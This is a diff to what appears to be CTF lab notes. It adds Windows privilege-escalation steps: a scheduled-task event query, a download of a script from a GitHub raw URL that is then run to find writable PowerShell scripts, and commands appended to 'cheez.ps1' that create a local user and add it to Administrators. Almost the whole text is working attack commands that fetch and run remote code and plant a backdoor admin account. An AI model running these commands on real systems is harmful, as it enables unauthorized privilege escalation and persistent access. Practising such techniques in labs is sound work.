@@ -40,7 +40,17 @@ Golden Ticket
 #Logon as admin via RDP
 #Logon as user via RDP
 #Exeute below as user
-Add to cheez.ps1
+
+#Search for schedueld tasks
+Get-WinEvent -FilterHashTable @{ LogName = "Microsoft-Windows-TaskScheduler/Operational"; ID = 200 }
+
+#Download TakeThis.ps1
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/robertteir/CTF/master/TakeThis.ps1" -OutFile "TakeThis.ps1"
+
+#Search for ps1 scripts that can be modified
+.\TakeThis.ps1
+
+#Add to cheez.ps1
 New-LocalUser "cheez" -Password (ConvertTo-SecureString -AsPlainText -String '****' -Force)
 Add-LocalGroupMember -Group "Administrators" -Member "cheez"
 
